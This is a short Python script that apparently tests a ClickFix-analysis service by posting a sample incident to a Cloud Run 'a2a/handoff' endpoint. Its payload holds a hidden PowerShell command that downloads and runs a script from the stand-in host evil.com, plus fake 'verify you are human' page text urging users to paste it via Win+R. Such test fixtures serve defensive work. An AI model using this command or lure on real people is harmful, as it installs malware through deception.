import requests
import json

url = "https://your-cloud-run-url.run.app/a2a/handoff"
payload = {
    "victim_url": "http://localhost:8000/test_clickfix.html",
    "culprit_js_url": "",
    "clipboard_payload": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass iex(new-object net.webclient).downloadstring('http://evil.com/payload.ps1')",
    "raw_dom": "<html>Fake Update<br>Press Win+R and paste the fix script to verify you are human.</html>"
}

print(f"Sending POST to {url}...")
try:
    response = requests.post(url, json=payload, timeout=10)
    print("Status:", response.status_code)
    print("Response:", response.json())
except Exception as e:
    print("Error:", e)
